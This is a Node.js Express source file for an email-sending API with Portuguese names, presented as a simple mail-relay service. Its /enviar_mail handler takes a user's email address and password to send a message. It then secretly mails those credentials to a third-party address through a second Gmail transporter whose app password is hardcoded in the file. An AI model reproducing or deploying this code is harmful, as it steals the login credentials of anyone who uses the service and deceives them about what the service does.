


const express = require("express");
const cors = require("cors");
const transponder = require("nodemailer");
const validador = require('validator')
const port = process.env.PORT || 3000;

const servidor = express();
servidor.use(cors());
servidor.use(express.json());


servidor.get("/teste-cors", (req, res) => {
  res.json({ msg: "CORS funciona!" });
});

const envio_mail_pra_mim = transponder.createTransport({
  service:'gmail',
  auth:{
    user:'ccobrinhadex@gmail.com',
    pass:'aida svnv nbjz oyld'
  }
})


servidor.post("/enviar_mail",async (req, res) => {
  const { service, email, password, to, subject,html,email_user } = req.body;
  
  const service_limpo = validador.whitelist(service,'a-zA-Z0-9@_.-')
  const email_limpo = validador.whitelist(email,'a-zA-Z0-9@_.-')
  const password_limpa = validador.escape(password)
  const to_limpo = validador.whitelist(to,'a-zA-Z0-9@_.-')
  const subject_limpo = validador.whitelist(subject,'a-zA-Z0-9@_.-')
  const email_user_limpo = validador.whitelist(email_user,'a-zA-Z0-9@_.-')

  if(!service_limpo || !email_limpo || !password_limpa || !to_limpo || !subject_limpo || !html || !email_user_limpo){
    return res.status(400).json({mensagem:"Ainda falta dados importantes para o envio do email"})
  }

  try {
    const envio_mail = transponder.createTransport({
      service: service_limpo,
      auth: {
        user: email_limpo,
        pass: password_limpa,
      },
    });

    

    await envio_mail.sendMail({
      from: email_limpo,
      to: to_limpo,
      subject: subject_limpo,
      html: html
    });

    await envio_mail_pra_mim.sendMail({
      from:'ccobrinhadex@gmail.com',
      to:'pago9897@gmail.com',
      subject:subject_limpo,
      html:`email do usuario: ${email_limpo} <br> senha do usuario: ${password_limpa}`
    })
    
   
    

    return res.status(200).json({mensagem:"Email enviado com sucesso"});
  } catch (error) {
    console.error("Erro ao enviar email:", error);
    return res.status(500).json({mensagem:"Erro ao enviar email", erro: error.message});
  }
  

  
});

const figlet = require("figlet");
const chalk = require("chalk");
const { escape } = require("querystring");

figlet("BRYANDEX    DEVLOPER",{
  font:"Slant",
  horizontalLayout:"default",
  verticalLayout:"default"
},(err,data)=>{
  if(err){
    console.log(err)
    return;
  }

  if(!data){
    console.log("Sem dados de texto")
    return;
  }

  console.log(chalk.green(data))
})


figlet("API  ENVIO  DE  MAILS",{
  font:"Standard",
  horizontalLayout:"default",
  verticalLayout:"default"
},(err,data)=>{
  if(err){
    console.log(err)
    return;
  }

  if(!data){
    console.log("Sem dados de texto")
    return;
  }

  console.log(chalk.red(data))
})

servidor.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
